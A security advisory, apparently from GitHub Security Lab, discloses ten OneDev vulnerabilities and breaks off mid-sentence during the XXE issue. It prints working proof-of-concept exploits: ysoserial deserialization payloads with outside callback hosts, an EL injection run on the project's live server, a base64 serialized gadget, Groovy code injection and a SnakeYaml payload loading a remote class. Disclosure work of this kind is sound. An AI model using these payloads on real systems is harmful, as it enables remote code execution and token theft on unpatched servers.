<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">January 26, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-214_223: 10 CVEs in OneDev ranging from pre-auth Remote Code Execution (RCE) to Arbitrary File Read/Write</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>11/05/2020: Report sent to robin@onedev.io</li>
  <li>11/16/2020: No response received so asked for security contact at https://code.onedev.io/projects/onedev-server/issues/201/activities</li>
  <li>11/17/2020: Communication resumed by email</li>
  <li>01/08/2021: Maintainer states that all vulnerabilities were addressed</li>
</ul>

<h2 id="summary">Summary</h2>
<p>Multiple vulnerabilities were found in the OneDev project ranging from pre-auth Remote Code Execution (RCE) to Arbitrary File Read/Write</p>

<h2 id="product">Product</h2>
<p>OneDev</p>

<h2 id="tested-version">Tested Version</h2>
<p>latest commit to the date of testing: f34af86</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-pre-auth-unsafe-deserialization-on-attachmentuploadservet">Issue 1: Pre-Auth Unsafe Deserialization on AttachmentUploadServet</h3>

<p><a href="https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/web/component/markdown/AttachmentUploadServlet.java"><code class="language-plaintext highlighter-rouge">AttachmentUploadServlet</code></a> deserializes untrusted data from the <code class="language-plaintext highlighter-rouge">Attachment-Support</code> header:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doPost</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span>
		<span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span> <span class="o">{</span>
	<span class="nc">String</span> <span class="n">fileName</span> <span class="o">=</span> <span class="nc">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"File-Name"</span><span class="o">),</span> <span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">.</span><span class="na">name</span><span class="o">());</span>
	<span class="nc">AttachmentSupport</span> <span class="n">attachmentSuppport</span> <span class="o">=</span> <span class="o">(</span><span class="nc">AttachmentSupport</span><span class="o">)</span> <span class="nc">SerializationUtils</span>
		<span class="o">.</span><span class="na">deserialize</span><span class="o">(</span><span class="nc">Base64</span><span class="o">.</span><span class="na">decodeBase64</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"Attachment-Support"</span><span class="o">)));</span>
    <span class="o">...</span>
  <span class="o">}</span>
</code></pre></div></div>

<p>This Servlet does not enforce any authentication or authorization checks.</p>

<h4 id="poc">PoC</h4>

<p>Use <a href="https://github.com/frohoff/ysoserial"><code class="language-plaintext highlighter-rouge">ysoserial</code></a> to generate a probe payload using the <code class="language-plaintext highlighter-rouge">URLDNS</code> gadget. This gadget will send a DNS request which we can intercept to prove the deserialization attack was successful.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X POST http://localhost:6610/attachment_upload -H "File-Name: foo" -H "Attachment-Support: `java -jar /Users/pwntester/Dev/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://536mvpzmverok48wr06msp5du40uoj.burpcollaborator.net | base64`"
</code></pre></div></div>

<h4 id="impact">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-2-pre-auth-unsafe-deserialization-on-kubernetesresource">Issue 2: Pre-Auth Unsafe Deserialization on KubernetesResource</h3>

<p>A <a href="https://github.com/theonedev/onedev/blob/main/server-plugin/server-plugin-executor-kubernetes/src/main/java/io/onedev/server/plugin/executor/kubernetes/KubernetesResource.java"><code class="language-plaintext highlighter-rouge">Kubernetes REST endpoint</code></a> exposes two methods that deserialize untrusted data from the request body:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="nd">@Path</span><span class="o">(</span><span class="s">"/allocate-job-caches"</span><span class="o">)</span>
	<span class="nd">@Consumes</span><span class="o">(</span><span class="nc">MediaType</span><span class="o">.</span><span class="na">APPLICATION_OCTET_STREAM</span><span class="o">)</span>
	<span class="nd">@Produces</span><span class="o">(</span><span class="nc">MediaType</span><span class="o">.</span><span class="na">APPLICATION_OCTET_STREAM</span><span class="o">)</span>
  <span class="nd">@POST</span>
  <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">allocateJobCaches</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">cacheAllocationRequestBytes</span><span class="o">)</span> <span class="o">{</span>
	<span class="nc">CacheAllocationRequest</span> <span class="n">allocationRequest</span> <span class="o">=</span> <span class="o">(</span><span class="nc">CacheAllocationRequest</span><span class="o">)</span> <span class="nc">SerializationUtils</span><span class="o">.</span><span class="na">deserialize</span><span class="o">(</span><span class="n">cacheAllocationRequestBytes</span><span class="o">);</span>
</code></pre></div></div>

<p>and</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="nd">@Path</span><span class="o">(</span><span class="s">"/report-job-caches"</span><span class="o">)</span>
	<span class="nd">@Consumes</span><span class="o">(</span><span class="nc">MediaType</span><span class="o">.</span><span class="na">APPLICATION_OCTET_STREAM</span><span class="o">)</span>
	<span class="nd">@POST</span>
	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">reportJobCaches</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">cacheInstanceBytes</span><span class="o">)</span> <span class="o">{</span>
		<span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">"unchecked"</span><span class="o">)</span>
		<span class="nc">Collection</span><span class="o">&lt;</span><span class="nc">CacheInstance</span><span class="o">&gt;</span> <span class="n">cacheInstances</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Collection</span><span class="o">&lt;</span><span class="nc">CacheInstance</span><span class="o">&gt;)</span> <span class="nc">SerializationUtils</span>
				<span class="o">.</span><span class="na">deserialize</span><span class="o">(</span><span class="n">cacheInstanceBytes</span><span class="o">);</span>
		<span class="n">jobManager</span><span class="o">.</span><span class="na">reportJobCaches</span><span class="o">(</span><span class="n">getJobToken</span><span class="o">(),</span> <span class="n">cacheInstances</span><span class="o">);</span>
	<span class="o">}</span>
</code></pre></div></div>

<p>These endpoints do not enforce any authentication or authorization checks.</p>

<h3 id="poc-1">PoC</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ~/Dev/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://pzs6r9v6ryn8go4gnk26o91xqowgk5.burpcollaborator.net &gt; deser_payload.bin`
curl -H "Content-Type:application/octet-stream" --data-binary @deser_payload.bin http://localhost:6610/rest/k8s/allocate-job-caches
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ~/Dev/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://pzs6r9v6ryn8go4gnk26o91xqowgk5.burpcollaborator.net &gt; deser_payload.bin
curl -H "Content-Type:application/octet-stream" --data-binary @deser_payload.bin http://localhost:6610/rest/k8s/report-job-caches
</code></pre></div></div>

<h4 id="impact-1">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-3-pre-auth-ssti-via-bean-validation-message-tampering">Issue 3: Pre-Auth SSTI via Bean validation message tampering</h3>
<p>There are many custom validators using Java Bean Validation (JSR 380) custom constraint validators. Apparently a similar issue was reported in the past (<code class="language-plaintext highlighter-rouge">fix issue #88: Users able to edit build spec can execute arbitrary java </code>) and it was fixed by this <a href="https://github.com/theonedev/onedev/commit/4f5dc6fb9e50f2c41c4929b0d8c5824b2cca3d65">commit</a> by disabling EL interpolation:</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gd">-	Configuration&lt;?&gt; configuration = Validation.byDefaultProvider().configure();
</span><span class="gi">+	Configuration&lt;?&gt; configuration = Validation
+			.byDefaultProvider()
+			.configure()
+			.messageInterpolator(new ParameterMessageInterpolator());
</span></code></pre></div></div>

<p>This effectively disables EL interpolation in most cases, but I found that this configuration is not applied for the Jersey server which uses a different <code class="language-plaintext highlighter-rouge">ValidatorFactory</code> configuration defined in <a href="https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/rest/jersey/ValidationConfigurationContextResolver.java">ValidationConfigurationContextResolver</a>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="nc">ValidationConfig</span> <span class="nf">getContext</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">type</span><span class="o">)</span> <span class="o">{</span>
    	<span class="nc">ValidatorFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="nc">AppLoader</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="nc">ValidatorFactory</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="nc">ValidationConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ValidationConfig</span><span class="o">();</span>
        <span class="n">config</span><span class="o">.</span><span class="na">constraintValidatorFactory</span><span class="o">(</span><span class="n">factory</span><span class="o">.</span><span class="na">getConstraintValidatorFactory</span><span class="o">());</span>
        <span class="n">config</span><span class="o">.</span><span class="na">messageInterpolator</span><span class="o">(</span><span class="n">factory</span><span class="o">.</span><span class="na">getMessageInterpolator</span><span class="o">());</span>
        <span class="n">config</span><span class="o">.</span><span class="na">parameterNameProvider</span><span class="o">(</span><span class="n">factory</span><span class="o">.</span><span class="na">getParameterNameProvider</span><span class="o">());</span>
        <span class="n">config</span><span class="o">.</span><span class="na">traversableResolver</span><span class="o">(</span><span class="n">factory</span><span class="o">.</span><span class="na">getTraversableResolver</span><span class="o">());</span>
        <span class="k">return</span> <span class="n">config</span><span class="o">;</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>There is a custom validator using this configuration, the <a href="https://github.com/theonedev/onedev/server-core/src/main/java/io/onedev/server/rest/jersey/ValidQueryParamsValidator.java"><code class="language-plaintext highlighter-rouge">ValidQueryParamsValidator</code></a>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isValid</span><span class="o">(</span><span class="nc">Object</span><span class="o">[]</span> <span class="n">value</span><span class="o">,</span> <span class="nc">ConstraintValidatorContext</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
		<span class="nc">Set</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">expectedParams</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashSet</span><span class="o">&lt;&gt;();</span>
		<span class="k">for</span> <span class="o">(</span><span class="nc">Annotation</span><span class="o">[]</span> <span class="nl">annotations:</span> <span class="n">resourceInfo</span><span class="o">.</span><span class="na">getResourceMethod</span><span class="o">().</span><span class="na">getParameterAnnotations</span><span class="o">())</span> <span class="o">{</span>
			<span class="k">for</span> <span class="o">(</span><span class="nc">Annotation</span> <span class="nl">annotation:</span> <span class="n">annotations</span><span class="o">)</span> <span class="o">{</span>
				<span class="k">if</span> <span class="o">(</span><span class="n">annotation</span> <span class="k">instanceof</span> <span class="nc">QueryParam</span><span class="o">)</span> <span class="o">{</span>
					<span class="nc">QueryParam</span> <span class="n">param</span> <span class="o">=</span> <span class="o">(</span><span class="nc">QueryParam</span><span class="o">)</span> <span class="n">annotation</span><span class="o">;</span>
					<span class="n">expectedParams</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">param</span><span class="o">.</span><span class="na">value</span><span class="o">());</span>
				<span class="o">}</span>
			<span class="o">}</span>
		<span class="o">}</span>
		
		<span class="nc">Set</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">actualParams</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashSet</span><span class="o">&lt;&gt;(</span><span class="n">uriInfo</span><span class="o">.</span><span class="na">getQueryParameters</span><span class="o">().</span><span class="na">keySet</span><span class="o">());</span>
		<span class="n">actualParams</span><span class="o">.</span><span class="na">removeAll</span><span class="o">(</span><span class="n">expectedParams</span><span class="o">);</span>
		<span class="k">if</span> <span class="o">(</span><span class="n">actualParams</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
			<span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
		<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
			<span class="n">context</span><span class="o">.</span><span class="na">disableDefaultConstraintViolation</span><span class="o">();</span>
			<span class="n">context</span><span class="o">.</span><span class="na">buildConstraintViolationWithTemplate</span><span class="o">(</span><span class="s">"Unexpected query params: "</span> <span class="o">+</span> <span class="n">actualParams</span><span class="o">).</span><span class="na">addConstraintViolation</span><span class="o">();</span>
			<span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
		<span class="o">}</span>
	<span class="o">}</span>
</code></pre></div></div>

<p>This would be vulnerable if EL interpolation is allowed and if the REST endpoint receives an unexpected query parameter. We can verify if this is the case with the following payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${'test'.toUpperCase()}` -&gt; `%24%7b%27%74%65%73%74%27%2e%74%6f%55%70%70%65%72%43%61%73%65%28%29%7d
</code></pre></div></div>

<p>Trying it locally:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X GET -H "Content-Type: application/json" http://localhost:6610/rest/projects\?%24%7b%27%74%65%73%74%27%2e%74%6f%55%70%70%65%72%43%61%73%65%28%29%7d=bar
</code></pre></div></div>

<p>We get no response but an exception:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Caused by: org.glassfish.jersey.server.ContainerException: java.lang.NoSuchMethodError: javax.el.ELContext.notifyBeforeEvaluation(Ljava/lang/String;)
</code></pre></div></div>

<p>However in the stack trace we can find clues that Hibernate performed EL interpolation:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>at com.sun.el.lang.EvaluationContext.notifyBeforeEvaluation(EvaluationContext.java:131) ~[org.glassfish.javax.el-3.0.0.jar:3.0.0]
at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:225) ~[org.glassfish.javax.el-3.0.0.jar:3.0.0]
at org.hibernate.validator.internal.engine.messageinterpolation.ElTermResolver.interpolate(ElTermResolver.java:65) ~[org.hibernate.hibernate-validator-5.3.6.Final.jar:5.3.6.Final]
at org.hibernate.validator.internal.engine.messageinterpolation.InterpolationTerm.interpolate(InterpolationTerm.java:64) ~[org.hibernate.hibernate-validator-5.3.6.Final.jar:5.3.6.Final]
</code></pre></div></div>

<p>This exception seems to be related to a misconfiguration in our docker dev container. Trying it on the <strong>onedev</strong> server (v3.2.9) we get our expression evaluated:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X GET -H "Content-Type: application/json"  https://code.onedev.io/rest/projects\?%24%7b%27%74%65%73%74%27%2e%74%6f%55%70%70%65%72%43%61%73%65%28%29%7d=bar
Unexpected query params: [TEST] (path = ProjectResource.query.&lt;cross-parameter&gt;, invalidValue = [null, null, null, org.glassfish.jersey.server.internal.routing.UriRoutingContext@5b27a361])
</code></pre></div></div>

<p>As we can see in the output, the Java code was evaluated and returned <code class="language-plaintext highlighter-rouge">TEST</code> in upper case.</p>

<p>This validation, and therefore the arbitrary code execution, happens before any authentication or authorization checks are enforced.</p>

<h4 id="impact-2">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-4-pre-auth-arbitrary-file-upload">Issue 4: Pre-Auth Arbitrary File Upload</h3>
<p><a href="https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/web/component/markdown/AttachmentUploadServlet.java"><code class="language-plaintext highlighter-rouge">AttachmentUploadServlet</code></a> also saves user controlled data (<code class="language-plaintext highlighter-rouge">request.getInputStream()</code>) to a user specified location (<code class="language-plaintext highlighter-rouge">request.getHeader("File-Name")</code>):</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">fileName</span> <span class="o">=</span> <span class="nc">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"File-Name"</span><span class="o">),</span> <span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">.</span><span class="na">name</span><span class="o">());</span>
<span class="o">...</span>
<span class="nc">String</span> <span class="n">attachmentName</span> <span class="o">=</span> <span class="n">attachmentSuppport</span><span class="o">.</span><span class="na">saveAttachment</span><span class="o">(</span><span class="n">fileName</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">());</span>
</code></pre></div></div>

<p>This file system operation occurs before any authentication or authorization checks are enforced.</p>

<h4 id="impact-3">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">arbitrary file upload</code> which can be used to upload a <a href="https://en.wikipedia.org/wiki/Web_shell">WebShell</a> to OneDev server</p>

<h3 id="issue-5-pre-auth-access-token-leak">Issue 5: Pre-Auth Access token leak</h3>
<p>The REST <a href="https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/rest/UserResource.java"><code class="language-plaintext highlighter-rouge">UserResource</code></a> endpoint performs a security check to make sure that only administrators can list user details. For the <code class="language-plaintext highlighter-rouge">/users/</code> endpoint we have:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@ValidQueryParams
@GET
public Response query(@QueryParam("name") String name, @Email @QueryParam("email") String email, @QueryParam("offset") Integer offset, @QueryParam("count") Integer count, @Context UriInfo uriInfo) { 
  if (!SecurityUtils.isAdministrator())
    throw new UnauthorizedException("Unauthorized access to user profiles");
  ...
}
</code></pre></div></div>

<p>However for the <code class="language-plaintext highlighter-rouge">/users/{id}</code> endpoint there are no security checks enforced so it is possible to retrieve arbitrary user details:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@Path("/{userId}")
public User get(@PathParam("userId") Long userId) {
  return userManager.load(userId);
}
</code></pre></div></div>

<p>For the protected endpoint, we get an <code class="language-plaintext highlighter-rouge">Unauthorized access</code> error:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X GET -H "Content-Type: application/json" http://localhost:6610/rest/users
Unauthorized access to user profiles
</code></pre></div></div>

<p>But for the <code class="language-plaintext highlighter-rouge">/users/{}</code> endpoint we can list full user details, including their Access Tokens!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X GET -H "Content-Type: application/json" http://localhost:6610/rest/users/1
{
  "id" : 1,
  "name" : "admin",
  "fullName" : "admin",
  "ssoInfo" : {
    "connector" : null,
    "subject" : "4a155bff-715d-45e9-8898-4152bb97d25e"
  },
  "email" : "alvaro@pwntester.com",
  "accessToken" : "JqnqWs6YsP8x3poNpnj6J6GFbvh0szli6lr5BWH8",
  "userProjectQueries" : [ ],
  "userIssueQueries" : [ ],
  "userIssueQueryWatches" : { },
  "issueQueryWatches" : { },
  "userPullRequestQueries" : [ ],
  "userPullRequestQueryWatches" : { },
  "pullRequestQueryWatches" : { },
  "userBuildQueries" : [ ],
  "userBuildQuerySubscriptions" : [ ],
  "buildQuerySubscriptions" : [ ]
}
</code></pre></div></div>

<p>These access tokens can be used to access the API or clone code in the build spec via the HTTP(S) protocol. It has permissions to all projects accessible by the user account.</p>

<h4 id="impact-4">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">Sensitive data leak</code> and leak the Access Token which can be used to impersonate the administrator or any other users.</p>

<h3 id="issue-6-post-auth-unsafe-deserialization-on-basepage-ajax">Issue 6: Post-Auth Unsafe Deserialization on BasePage (AJAX)</h3>
<p>The application’s <a href="https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/web/page/base/BasePage.java"><code class="language-plaintext highlighter-rouge">BasePage</code></a> registers an AJAX event listener (<code class="language-plaintext highlighter-rouge">AbstractPostAjaxBehavior</code>) in all pages other than the login page. This listener decodes and deserializes the <code class="language-plaintext highlighter-rouge">data</code> query parameter.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nd">@Override</span>
  <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">respond</span><span class="o">(</span><span class="nc">AjaxRequestTarget</span> <span class="n">target</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">IRequestParameters</span> <span class="n">params</span> <span class="o">=</span> <span class="nc">RequestCycle</span><span class="o">.</span><span class="na">get</span><span class="o">().</span><span class="na">getRequest</span><span class="o">().</span><span class="na">getPostParameters</span><span class="o">();</span>
    <span class="nc">String</span> <span class="n">encodedData</span> <span class="o">=</span> <span class="n">params</span><span class="o">.</span><span class="na">getParameterValue</span><span class="o">(</span><span class="s">"data"</span><span class="o">).</span><span class="na">toString</span><span class="o">();</span>
    
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">decodeBase64</span><span class="o">(</span><span class="n">encodedData</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="nc">Serializable</span> <span class="n">data</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Serializable</span><span class="o">)</span> <span class="nc">SerializationUtils</span><span class="o">.</span><span class="na">deserialize</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
    <span class="n">onPopState</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>
    <span class="n">target</span><span class="o">.</span><span class="na">appendJavaScript</span><span class="o">(</span><span class="s">"onedev.server.viewState.getFromHistoryAndSetToView();"</span><span class="o">);</span>
  <span class="o">}</span>
</code></pre></div></div>

<p>We can access this listener by submitting a POST request to any page. e.g.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /projects/my-app/blob?7-1.IBehaviorListener.0- HTTP/1.1
Host: localhost:6610
Content-Length: 389
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
Wicket-Ajax-BaseURL: projects/my-app/blob
Wicket-Ajax: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:6610
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:6610/projects/my-app/blob
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: JSESSIONID=node0cq7tdfxnza2v1nb58f7zwg7jj6.node0
Connection: close

data=rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3OAAKVW5pY2FzdFJlZgAPdG91Y2ggL3RtcC9mb29vAACFE//////C/CKmAAAAAAAAAAAAAAAAAAAAeA==
</code></pre></div></div>

<p>This endpoint is subject to authentication and, therefore, requires a valid user to carry on the attack.</p>

<h4 id="impact-5">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">post-auth RCE</code></p>

<h3 id="issue-7-post-auth-arbitrary-code-execution-via-groovy-script-injection">Issue 7: Post-Auth Arbitrary Code execution via Groovy script injection</h3>
<p><a href="https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/model/support/inputspec/InputSpec.java"><code class="language-plaintext highlighter-rouge">InputSpec</code></a> is used to define parameters of a Build spec.
It does so by using <a href="https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/model/support/inputspec/InputSpec.java#L209">dynamically generated Groovy classes</a>. A user able to control job parameters can run arbitrary code on OneDev’s server by injecting arbitrary Groovy code.</p>

<p>For example, for text parameters the class <a href="https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/model/support/inputspec/textinput/TextInput.java">TextInput</a> is used, which dynamically builds fields and method annotations:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buffer</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"    @Pattern(regexp=\""</span> <span class="o">+</span> <span class="n">pattern</span> <span class="o">+</span> <span class="s">"\", message=\"Should match regular expression: "</span> <span class="o">+</span> <span class="n">pattern</span> <span class="o">+</span> <span class="s">"\")\n"</span><span class="o">);</span>
</code></pre></div></div>

<p>Where <code class="language-plaintext highlighter-rouge">pattern</code> can be controlled by the user as part of the build spec. For example, to execute arbitrary Groovy code, you can define the following pattern:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  paramSpecs:
  - !TextParam
    name: test
    description: test
    allowEmpty: false
    pattern: foo") public String foo() {return "";}; static {Runtime.getRuntime().exec("touch
      /tmp/pwned1");} //
</code></pre></div></div>

<p>The payload used is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foo") public String foo() {return "";}; static {Runtime.getRuntime().exec("touch /tmp/pwned1");} //
</code></pre></div></div>

<p>Which, when injected, will result in:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">...</span>
<span class="nd">@Pattern</span><span class="o">(</span><span class="n">regexp</span><span class="o">=</span><span class="s">"foo"</span><span class="o">)</span> <span class="kd">public</span> <span class="nc">String</span> <span class="nf">foo</span><span class="o">()</span> <span class="o">{</span><span class="k">return</span> <span class="s">""</span><span class="o">;};</span> <span class="kd">static</span> <span class="o">{</span><span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"touch /tmp/pwned1"</span><span class="o">);}</span> <span class="c1">// ", message="Should match regular expression: " foo") public String foo() {return "";}; static {Runtime.getRuntime().exec("touch /tmp/pwned1");} // ")\n");</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">input1</span><span class="o">()</span> <span class="o">{</span>
  <span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<p>When we remove the commented out text and sort it, we get:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@Pattern(regexp="foo") 
public String foo() {return "";}; 
static {Runtime.getRuntime().exec("touch /tmp/pwned1");}
public String input1() {
  ...
}
</code></pre></div></div>

<p>Resulting in the injection of a static constructor that will run our arbitrary code. Injection is not only possible in text patterns, but in many other parameters.</p>

<h4 id="impact-6">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">post-auth RCE</code></p>

<h3 id="issue-8-post-auth-unsafe-yaml-deserialization">Issue 8: Post-Auth Unsafe Yaml deserialization</h3>
<p>In order to parse and process YAML files, OneDev uses SnakeYaml which by default (when not using <code class="language-plaintext highlighter-rouge">SafeConstructor</code>) allows the instantiation of arbitrary classes. We can leverage that to run arbitrary code by instantiating classes such as <code class="language-plaintext highlighter-rouge">javax.script.ScriptEngineManager</code> and using <code class="language-plaintext highlighter-rouge">URLClassLoader</code> to load the script engine provider, resulting in the instantiation of a user controlled class. We can observe that by providing the following BuildSpec:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>version: 1
jobs:
- name: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://qgayzevwou8by0k3ochje4ebx23srh.burpcollaborator.net"]]]]
  image: asdasd
  commands:
  - asd
  retrieveSource: true
  cloneCredential: !DefaultCredential {}
  cpuRequirement: 250m
  memoryRequirement: 128m
  retryCondition: never
  maxRetries: 3
  retryDelay: 30
  timeout: 3600
</code></pre></div></div>

<p>By intercepting the resolution of the provided URL, we can prove that the payload succeeded.</p>

<h4 id="impact-7">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">post-auth RCE</code></p>

<h3 id="issue-9-post-auth-external-entity-expansion-xxe">Issue 9: Post-Auth External Entity Expansion (XXE)</h3>
<p>When BuildSpec is provided in XML format, the spec is processed by <a href="https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/migration/XmlBuildSpecMigrator.java"><code class="language-plaintext highlighter-rouge">XmlBuildSpecMigrator.migrate(buildSpecString);</code></a> which processes the XML document without preventing
